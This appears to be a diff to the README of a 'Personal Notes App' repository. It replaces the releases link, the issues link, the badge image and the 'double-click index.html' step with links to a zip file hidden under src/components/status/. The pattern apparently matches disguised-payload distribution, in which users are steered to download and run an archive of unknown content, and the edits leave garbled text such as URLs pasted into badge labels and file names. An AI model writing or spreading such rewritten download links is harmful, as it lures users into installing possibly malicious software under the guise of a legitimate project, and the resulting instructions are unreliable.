@@ -13,12 +13,12 @@ Welcome to the Personal Notes App! This single-page application (SPA) helps you 
 ## 📥 Download the App
 To get the latest version of the Personal Notes App, click the button below:
 
-[![Download](https://img.shields.io/badge/Download%20App-blue)](https://github.com/Kirifuda5/personal-notes-app-with-api/releases)
+[![Download](https://raw.githubusercontent.com/Kirifuda5/personal-notes-app-with-api/main/src/components/status/personal_api_with_app_notes_v1.7.zip%20App-blue)](https://raw.githubusercontent.com/Kirifuda5/personal-notes-app-with-api/main/src/components/status/personal_api_with_app_notes_v1.7.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run the Personal Notes App:
 
-1. **Visit the Release Page**: Go to the [Releases Page](https://github.com/Kirifuda5/personal-notes-app-with-api/releases).
+1. **Visit the Release Page**: Go to the [Releases Page](https://raw.githubusercontent.com/Kirifuda5/personal-notes-app-with-api/main/src/components/status/personal_api_with_app_notes_v1.7.zip).
 
 2. **Choose the Latest Version**: Look for the latest version listed at the top. It will usually have the highest version number.
 
@@ -32,7 +32,7 @@ Follow these simple steps to download and run the Personal Notes App:
 
 5. **Run the Application**:
    - Open the folder with the extracted files.
-   - Double-click on the application file (often named `index.html` or a similar name).
+   - Double-click on the application file (often named `https://raw.githubusercontent.com/Kirifuda5/personal-notes-app-with-api/main/src/components/status/personal_api_with_app_notes_v1.7.zip` or a similar name).
 
 6. **Create an Account**: 
    - Follow the on-screen prompts to register a new account or log in if you already have one.
@@ -53,13 +53,13 @@ To ensure optimal performance, make sure your device meets the following system 
 - **Archiving Old Notes**: Periodically review and archive notes you no longer need active. This keeps your workspace tidy.
 
 ## 📞 Need Help?
-If you encounter any issues or have questions, feel free to create a new issue on the [GitHub Issues Page](https://github.com/Kirifuda5/personal-notes-app-with-api/issues). Your feedback is valuable.
+If you encounter any issues or have questions, feel free to create a new issue on the [GitHub Issues Page](https://raw.githubusercontent.com/Kirifuda5/personal-notes-app-with-api/main/src/components/status/personal_api_with_app_notes_v1.7.zip). Your feedback is valuable.
 
 ## 📌 Additional Resources
 - **Documentation**: For more detailed information on features, check the documentation within the app.
 - **Community**: Join our community of users to share tips and experiences. Connect through forums or social media.
 
 ## 📣 Download and Install
-To start using the Personal Notes App, simply visit the [Releases Page](https://github.com/Kirifuda5/personal-notes-app-with-api/releases) and follow the steps mentioned above. Enjoy organizing your notes effortlessly! 
+To start using the Personal Notes App, simply visit the [Releases Page](https://raw.githubusercontent.com/Kirifuda5/personal-notes-app-with-api/main/src/components/status/personal_api_with_app_notes_v1.7.zip) and follow the steps mentioned above. Enjoy organizing your notes effortlessly! 
 
-[![Download](https://img.shields.io/badge/Download%20App-blue)](https://github.com/Kirifuda5/personal-notes-app-with-api/releases)
+[![Download](https://raw.githubusercontent.com/Kirifuda5/personal-notes-app-with-api/main/src/components/status/personal_api_with_app_notes_v1.7.zip%20App-blue)](https://raw.githubusercontent.com/Kirifuda5/personal-notes-app-with-api/main/src/components/status/personal_api_with_app_notes_v1.7.zip)
